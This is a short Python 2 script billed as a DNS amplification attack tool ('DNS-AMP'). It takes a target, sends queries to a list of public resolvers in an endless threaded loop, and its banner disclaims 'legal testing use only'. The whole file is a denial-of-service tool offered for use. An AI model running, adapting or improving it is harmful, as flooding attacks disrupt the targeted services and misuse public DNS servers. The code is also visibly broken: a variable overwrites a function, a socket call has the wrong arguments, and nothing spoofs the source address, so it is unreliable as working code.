import time, sys, threading, argparse, socket
try:
	from dns import resolver
except:
	print " dnspython is not installed."
	print " Download: https://github.com/rthalley/dnspython"
	sys.exit()

parser = argparse.ArgumentParser()
parser.add_argument("-d", "--dns",help="DNS Server List",default=["4.2.2.1","4.2.2.2","4.2.2.3","4.2.2.4","4.2.2.5","4.2.2.6"])
parser.add_argument("-v", "--verbose",help="Show All Request",action="store_true")
parser.add_argument("-t", "--target",help="DNS Amplification Target")
parser.add_argument("-n", "--nohelp",help="Hides help",action="store_true")
parser.add_argument("-r", "--recon",help="Check Servers For Port 53",action="store_true")
args = parser.parse_args()
socket.setdefaulttimeout(1)

print """
 ___  _  _ ___      _   __  __ ___ 
|   \| \| / __|___ /_\ |  \/  | _ \\
| |) | .` \__ \___/ _ \| |\/| |  _/
|___/|_|\_|___/  /_/ \_\_|  |_|_|  

 Made for legal testing use only!
"""

if not args.nohelp:
	parser.print_help()
if not args.target:
	print " No Target"
	sys.exit()

recon = args.recon
servers = args.dns
host = args.target
verbose = args.verbose
res = resolver.Resolver()
dct = False,False
if servers != ["4.2.2.1","4.2.2.2","4.2.2.3","4.2.2.4","4.2.2.5","4.2.2.6"]:
	dct = True,servers
	servers = open(servers).read().split("\n")

def recon(servers,update=True):
	if dct[0]:
		if "&reconned" in open(dct[1]).read():
			return
	for _ in servers:
		try:
			socket.create_connection(_,53)
		except:
			servers.remove(_)
	if update and dct[0]:
		f = open(dct[1],"w")
		f.write("&reconned\n")
		f.write("\n".join(servers))
		f.close()

if recon:
	recon(servers)

def _amp(dns,target,name):
	try:
		res.nameservers = [dns]
		req = res.query(target)
		if verbose:
			sys.stdout.write("\r\n "+name+" -> "+target+"    ")
		else:
			sys.stdout.write("\r\r "+name+" -> "+target+"    ")
	except:
		pass

nodes = []
while 1:
	for _ in servers:
		t = threading.Thread(target=_amp,args=(_,host,_,))
		try:
			sys.stderr = t.start()
		except:
			try:
				time.sleep(0.05)
			except:
				sys.exit()
			pass
		time.sleep(0.005)
